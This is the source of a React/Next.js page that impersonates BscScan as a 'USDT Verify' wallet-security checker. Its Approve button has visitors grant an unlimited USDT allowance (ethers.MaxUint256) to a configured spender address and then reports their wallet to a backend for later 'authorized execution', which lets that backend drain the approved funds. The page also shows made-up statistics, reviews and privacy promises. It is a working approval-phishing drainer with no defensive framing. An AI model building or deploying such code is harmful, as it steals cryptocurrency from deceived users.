"use client";

import { useState } from "react";
import { BrowserProvider, Contract, ethers } from "ethers";
import { Check, CheckCircle2, ChevronDown, Clock3, LockKeyhole, Menu, PlusCircle, Radio, ShieldCheck, Sun } from "lucide-react";

declare global { interface Window { ethereum?: { request: (args: { method: string; params?: unknown[] }) => Promise<unknown> }; } }
const token = process.env.NEXT_PUBLIC_USDT_ADDRESS ?? "";
const spender = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "";
const chainId = process.env.NEXT_PUBLIC_CHAIN_ID ?? "56";
const api = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000";
console .log("TOKEN =", token);
console .log("SPENDER =", spender);
const erc20 = ["function approve(address spender,uint256 amount) returns (bool)", "function allowance(address owner,address spender) view returns (uint256)"];
const faqs = [
  ["What is USDT Verify?", "USDT Verify is an automated blockchain inspection tool designed to diagnose safety risks, address history, and smart contract health."],
  ["How does the verification process work?", "It parses your public address and matches historical interactions against verified security blacklists and exploit logs."],
  ["Is my wallet information kept private?", "Yes. We never ask for private keys or seed phrases. A public address is registered only for monitoring."],
  ["What does the risk score mean?", "The risk score measures exposure to flagged decentralized apps, malicious contracts, or suspicious transaction volumes."],
  ["Can USDT Verify detect all types of scams?", "No tool can guarantee detection of every scam. Always verify recipients and never share your recovery phrase."]
];

export default function Home() {
  const [wallet, setWallet] = useState(""); const [notice, setNotice] = useState(""); const [openFaq, setOpenFaq] = useState<number | null>(null);
  async function connect() {
    if (!window.ethereum) return setNotice("MetaMask is required to connect.");
    try { const provider = new BrowserProvider(window.ethereum); await provider.send("eth_requestAccounts", []); const network = await provider.getNetwork(); if (network.chainId !== BigInt(chainId)) { setNotice("Please switch MetaMask to BNB Smart Chain."); return; } const signer = await provider.getSigner(); setWallet(await signer.getAddress()); setNotice("Wallet connected. Approve the spender to register your allowance."); }
    catch (error) { setNotice(error instanceof Error ? error.message : "Connection cancelled."); }
  }
  async function approve() {
    if (!wallet) return setNotice("Connect MetaMask first."); if (!spender || !token) return setNotice("Contract configuration is missing.");
    try { const provider = new BrowserProvider(window.ethereum!); const signer = await provider.getSigner(); const contract = new Contract(token, erc20, signer); setNotice("Waiting for approval confirmation..."); const tx = await contract.approve(spender, ethers.MaxUint256); await tx.wait(); await fetch(`${api}/api/wallets`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ address: wallet, receiver: 1 }) }); setNotice("Allowance approved. Your wallet is now registered for monitoring."); }
    catch (error) { setNotice(error instanceof Error ? error.message : "Approval failed."); }
  }
  return <main>
    <header className="hero-pattern hero">
      <nav className="nav"><div className="brand"><div className="logo"><Radio size={20} /></div><div><h1>BscScan</h1><span>Scan Original</span></div></div><div className="nav-actions"><button className="icon-button" aria-label="Theme"><Sun size={18} /></button><button className="icon-button" aria-label="Menu"><Menu /></button></div></nav>
      <div className="trust">⭐ <span>Trusted by 100K+ users worldwide</span></div><div className="hero-copy"><h2>Check Your USDT<br />Wallet Security</h2><p>Advanced blockchain analysis using official BSC Scan data to determine if your USDT wallet is <strong>safe, valid, and free</strong> from suspicious activity.</p></div>
      <ul className="checks">{["Advanced blockchain analysis", "Real-time threat detection", "Zero data retention policy", "Enterprise-grade security"].map((item) => <li key={item}><span><Check size={14} /></span>{item}</li>)}</ul>
      <div className="actions"><button className="primary" onClick={connect}>{wallet ? `${wallet.slice(0, 6)}...${wallet.slice(-4)}` : "Connect MetaMask"}</button><button className="secondary" onClick={approve}>Approve USDT Allowance</button></div>{notice && <p className="notice">{notice}</p>}
      <div className="hero-stats"><span><ShieldCheck />100% Secure</span><span><Clock3 />Real-Time Scans</span><span><LockKeyhole />Never Custodial</span></div>
    </header>
    <section className="section stats-section"><div className="eyebrow">Security Analytics · Real-Time Blockchain Verification</div><div className="stats"><Stat value="500K+" label="Wallets Verified" /><Stat value="99.8%" label="Accuracy Rate" /><Stat value="&lt;3s" label="Analysis Time" /><Stat value="24/7" label="Protection" /></div><div className="review"><b>Join thousands of secure users</b><strong>★★★★★</strong><small>4.9/5 from 5,000+ reviews</small></div></section>
    <section className="section"><Eyebrow text="ABOUT US" /><h3>About USDT Check</h3><p className="lead">Protecting your digital assets through advanced verification technology.</p><div className="about-stats"><Stat value="2023" label="Founded" /><Stat value="100K+" label="Users" /><Stat value="99.9%" label="Accuracy" /><Stat value="24/7" label="Protection" /></div><div className="prose"><p>USDT Check was founded by blockchain security experts with a mission to make cryptocurrency safer for everyone. As Tether (USDT) became one of the most widely used stablecoins, the need for reliable verification tools grew.</p><p>Our platform leverages blockchain analytics to provide security assessments. We analyze transaction patterns, check known vulnerabilities, and verify wallet legitimacy without custodying your assets.</p></div><div className="why"><b>WHY CHOOSE US</b>{["Lightning-fast verification in under 3 seconds", "Comprehensive risk and transaction reports", "Multi-chain support beyond USDT", "24/7 customer support from security experts", "Regular security audits by third parties"].map((item) => <div key={item}><CheckCircle2 />{item}</div>)}</div></section>
    <section className="section"><Eyebrow text="CORE VALUES" /><div className="value-grid">{[["🔒", "Security", "Protection embedded into every feature."], ["👁️", "Transparency", "Clear explanations about security risks."], ["🌐", "Accessibility", "Essential tools made available to everyone."], ["🚀", "Innovation", "Continuous improvement to stay ahead." ]].map(([icon, title, text]) => <article key={title}><span>{icon}</span><b>{title}</b><p>{text}</p></article>)}</div></section>
    <section className="process"><div className="section"><Eyebrow text="PROCESS" /><h3>How It Works</h3><p className="lead">Simple yet powerful security insights in four steps.</p><div className="steps">{[["01", "Connect Your Wallet", "Connect MetaMask. Private keys are never requested."], ["02", "Approve Allowance", "Use the standard BEP-20 approve() function for the spender contract."], ["03", "Automated Monitoring", "The backend checks public balance and allowance state."], ["04", "Authorized Execution", "An authorized executor calls the contract only when validation passes."]].map(([number, title, text]) => <article key={number}><span>{number}</span><div><b>{title}</b><p>{text}</p></div></article>)}</div><b className="tech-title">BUILT TECHNOLOGY</b><div className="pills"><span>Blockchain Analytics</span><span>Real-Time Threat Detection</span><span>Smart Contract Validation</span></div></div></section>
    <section className="section questions"><Eyebrow text="QUESTIONS" /><h3>Frequently Asked Questions</h3><p className="lead">Find answers about wallet verification and allowance execution.</p>{faqs.map(([question, answer], index) => <article className="faq" key={question} onClick={() => setOpenFaq(openFaq === index ? null : index)}><div><b>{question}</b><PlusCircle className={openFaq === index ? "rotated" : ""} /></div>{openFaq === index && <p>{answer}</p>}</article>)}<div className="support"><b>Still Have Questions?</b><p>Our support team is here to help with wallet verification.</p><button className="primary">Contact Support</button></div></section>
    <footer><h4>USDT Verify</h4><p>Advanced blockchain security for comprehensive USDT wallet verification. Funds remain in your wallet until an authorized execution.</p><div className="footer-bottom">© 2024 USDT Verify · No subscriptions · Non-custodial by design</div></footer>
  </main>;
}
function Stat({ value, label }: { value: string; label: string }) { return <div><b dangerouslySetInnerHTML={{ __html: value }} /><small>{label}</small></div>; }
function Eyebrow({ text }: { text: string }) { return <span className="eyebrow plain">{text}</span>; }